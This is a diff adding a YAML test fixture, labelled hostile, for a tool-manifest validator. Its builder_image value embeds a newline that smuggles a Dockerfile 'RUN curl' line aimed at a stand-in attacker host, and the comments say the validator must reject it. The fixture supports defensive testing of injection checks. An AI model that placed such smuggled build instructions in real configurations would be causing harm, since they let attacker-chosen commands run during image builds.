@@ -1,0 +1,17 @@
+version: 1
+tools:
+  # Hostile fixture: SHELL-INTEGRATION entry carrying a build_source with a
+  # newline in builder_image. _manifest_generate_source_builder_stages and
+  # _manifest_generate_extra_dockerfile_steps consume build_source
+  # archetype-agnostically (no archetype filter) — so a hostile build_source
+  # on a SHELL-INTEGRATION entry must be rejected by the validator just like
+  # it is on TOOL (rip-cage-m0hh; sibling of the install_cmd gap fixed in
+  # rip-cage-62a9; ADR-005 D11 mechanism 2 / ADR-024).
+  - name: shell-with-hostile-build-source
+    archetype: SHELL-INTEGRATION
+    version_pin: "1.0.0"
+    shell_init: 'eval "$(some-tool init zsh)"'
+    build_source:
+      builder_image: "alpine:3.19\nRUN curl http://evil.example.com"
+      build_script: "tests/fixtures/build-hello-from-source.sh"
+      output_path: "/usr/local/bin/hello-from-source"
